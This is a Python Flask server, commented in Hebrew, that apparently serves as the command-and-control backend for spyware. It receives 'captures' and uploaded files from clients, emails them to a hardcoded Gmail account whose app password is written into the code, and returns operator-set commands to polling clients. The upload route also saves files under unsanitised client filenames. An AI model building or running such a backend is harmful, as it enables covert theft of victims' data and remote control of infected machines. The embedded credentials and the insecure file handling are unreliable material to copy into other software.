import os, smtplib
from flask import Flask, request, jsonify
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

app = Flask(__name__)

# --- הגדרות אימייל ---
EMAIL_USER = "n77971507@gmail.com"
EMAIL_PASS = "kcfy rlwm uqqw vgil"

# המשתנה הזה שומר את הפקודה שמחכה ללקוח בזיכרון של השרת
current_cmd = "OK"


def send_to_mail(subject, body, file_path=None):
    msg = MIMEMultipart()
    msg['From'], msg['To'], msg['Subject'] = EMAIL_USER, EMAIL_USER, subject
    msg.attach(MIMEText(body, 'plain'))
    if file_path:
        with open(file_path, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
            msg.attach(part)
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(EMAIL_USER, EMAIL_PASS)
        s.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string())
        s.quit()
    except Exception as e:
        print(f"Mail Error: {e}")


@app.route('/api/client', methods=['POST'])
def client():
    global current_cmd
    data = request.json.get("data")
    if data:
        send_to_mail("New Capture", data)

    # מחזיר ללקוח את הפקודה שנקבעה ע"י ה-UI
    return current_cmd, 200


@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    path = os.path.join("/tmp", f.filename)
    f.save(path)
    send_to_mail(f"File: {f.filename}", "Attached PDF", path)
    os.remove(path)
    return "OK", 200


@app.route('/api/admin/command', methods=['POST'])
def admin():
    global current_cmd
    # עדכון הפקודה שמחכה ללקוח
    current_cmd = request.json.get("command", "OK")
    return "Updated", 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))